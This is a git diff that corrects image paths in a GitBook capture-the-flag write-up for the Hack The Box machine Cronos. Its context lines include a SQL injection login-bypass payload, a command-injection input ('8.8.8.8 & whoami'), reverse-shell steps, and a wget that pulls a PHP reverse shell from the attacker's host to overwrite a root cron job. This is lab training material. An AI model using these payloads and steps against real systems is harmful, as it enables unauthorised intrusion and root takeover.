@@ -40,7 +40,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ## HTTP
 
-<figure><img src="../../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Webfuzz
 
@@ -64,7 +64,7 @@ Found: admin.cronos.htb (Status: 200) [Size: 1547]
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### SQLi
 
@@ -76,7 +76,7 @@ We use the following payload for authentication bypass
 admin' or '
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 We will now test for OS Command Injection
 
@@ -84,7 +84,7 @@ We will now test for OS Command Injection
 8.8.8.8 & whoami
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>
 
 We can see we are the `www-data` user, so next we'll try to get a reverse shell
 
@@ -104,23 +104,23 @@ Enter this and click `execute`
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
 Check your listener and you should have a shell
 
-<figure><img src="../../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
 Checking for scheduled tasks, we see there's a file called `artisan` that is running as a cron job with root privileges every minute of every hour of every month of every day of the week. We'll replace the contents of the file with a php reverse shell.
 
-<figure><img src="../../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
 
 I used revshells.com to generate a reverse shell and pasted it into a file called `privesc.php`
 
 {% embed url="https://www.revshells.com/" %}
 
-<figure><img src="../../../../.gitbook/assets/image (21) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (2).png" alt=""><figcaption></figcaption></figure>
 
 Using a python web server, I download the file onto the victim machine and changed the name to match the filename in the cron job
 
@@ -128,10 +128,10 @@ Using a python web server, I download the file onto the victim machine and chang
 wget 10.10.14.19/privesc.php
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 Now set up a new listener (in my case, I will listen on port 445) and in just a few seconds, you should receive another shell, but this time as root
 
-<figure><img src="../../../../.gitbook/assets/image (17) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (3).png" alt=""><figcaption></figcaption></figure>
